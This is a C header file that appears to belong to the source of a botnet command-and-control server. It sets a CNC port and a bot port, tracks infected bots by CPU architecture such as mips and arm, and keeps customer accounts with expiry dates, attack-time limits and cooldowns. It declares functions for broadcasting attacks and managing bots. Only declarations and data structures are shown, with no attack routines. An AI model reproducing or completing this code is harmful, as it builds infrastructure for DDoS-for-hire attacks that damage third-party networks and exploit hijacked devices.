#define _GNU_SOURCE
#include <time.h>
#include <stdio.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <ctype.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/epoll.h>
#include <arpa/inet.h>

#define MAXFDS 100000
#define CncPort 3403
#define bot_port 6666
#define MAXARCH 32

char motd[2048], iplog[800], filestring[5000];
int runningattacks;

struct login_info
{
	char username[100], password[100], id[200], expiry[100];
	int maxtime, cooldown;
} accounts[100];
struct clientdata_t
{
	uint32_t ip;
	int pings;
	char arch[30], host[64], connected;
} clients[MAXFDS];
struct telnetdata_t
{
	char Buffer[80];
	char username[30], password[30], id[30], expiry[100], my_ip[100], maxbots[100];
	int AdminStatus, maxtime, cooldown, connected, CoolDownStatus, CoolDownSecs, OwnerStatus, ArchStatus, FreeStatus;
} managements[MAXFDS];
struct buF
{
	char buffer[512];
} buf[MAXFDS];
struct toast
{
	char string[240];
	int status, just_logged_in;
} Title[MAXFDS];
struct CoolDownArgs
{
	int sock, seconds;
	uint32_t ip;
};
struct AtkArgs
{
    int seconds;
};
struct arch_data_t {
    int bots;
    char arch[32];
};
typedef struct arch_t {
    int bots, loc;
    char arch[32];

    struct arch_t *prev, *next;
} Arch;
Arch *arch_head;

void filter_arch();

extern int EpollFD, ListenFD, UsersAttacks, DupesDeleted, ToggleAttacks, toggledmotd, toggledlogins, x86_64, i686, i586, mips, mipsel, armv4l, armv5l, armv6l, armv7l, unknown;
int DelFD(int);
void countArch();
void filterArch();
void trim(char *);
void *BotListener();
void *BotEventLoop();
char *encode(char *);
int Accounts_Reload();
int Find_Login(char *);
char *changeStr(char *);
void *BotWorker(void *);
void *broadcast(char *);
int create_and_bind();
void *StartCldown(void *);
unsigned int UsersConned();
unsigned int BotsConnected();
int fdgets(char *, int, int);
int sendfd(int, char *, ...);
char *checkifip(char *, char *);
void sendfile(int, const char *);
int make_socket_non_blocking(int);
void *StartAttackBroadcast(void *);
int SendLog(int, char *, char *, ...);
char **str_split(char *, char *, size_t *);
